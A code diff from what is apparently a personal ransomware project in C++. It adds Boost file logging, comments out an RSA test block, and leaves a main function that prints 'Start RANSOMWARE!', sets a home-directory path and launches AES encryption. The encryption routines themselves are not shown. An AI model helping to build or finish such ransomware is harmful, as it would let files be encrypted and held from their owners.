@@ -8,6 +8,20 @@
 #include <cmath>
 #include "encryptor.h"
 #include "aes_algo.h"
+#include <boost/log/trivial.hpp>
+#include <boost/log/core.hpp>
+#include <boost/log/trivial.hpp>
+#include <boost/log/expressions.hpp>
+#include <boost/log/sinks/text_file_backend.hpp>
+#include <boost/log/utility/setup/file.hpp>
+#include <boost/log/utility/setup/common_attributes.hpp>
+#include <boost/log/sources/severity_logger.hpp>
+#include <boost/log/sources/record_ostream.hpp>
+
+namespace logging = boost::log;
+namespace src = boost::log::sources;
+namespace sinks = boost::log::sinks;
+namespace keywords = boost::log::keywords;
 
 std::mutex tmp_mut;
 DirectoryIiterator* _directoryIt = new DirectoryIiterator();
@@ -84,12 +98,28 @@ void old() {
     std::cout << "DIR Size: " << dirs.size() << std::endl;
 }
 
+void init()
+{
+    logging::add_file_log(
+            keywords::file_name = "sample_%N.log",
+            keywords::rotation_size = 10 * 1024 * 1024,
+            keywords::time_based_rotation = sinks::file::rotation_at_time_point(0, 0, 0),
+            keywords::format = "[%TimeStamp%]: %Message%"
+    );
+
+    logging::core::get()->set_filter
+            (
+                    logging::trivial::severity >= logging::trivial::info
+            );
+}
 
 int main(int argc, char** argv) {
 
+    init();
+    BOOST_LOG_TRIVIAL(info) << "TEST log message";
     std::cout << "Start RANSOMWARE!" << std::endl;
     std::string path3 = "/home/christian/";
-
+    /*
     RSAAlgorithm *encrypter = new RSAAlgorithm();
     //RSAAlgorithm *decryptor = new RSAAlgorithm();
 
@@ -109,7 +139,7 @@ int main(int argc, char** argv) {
     char* decrypt = encrypter->decrypt(privKey, ct);
 
     std::cout << "decrypt: " << decrypt << std::endl;
-
+    */
     std::cout << "start aes encryption" << std::endl;
     AESAlgorithm *aesalgo = new AESAlgorithm();
     aesalgo->start();
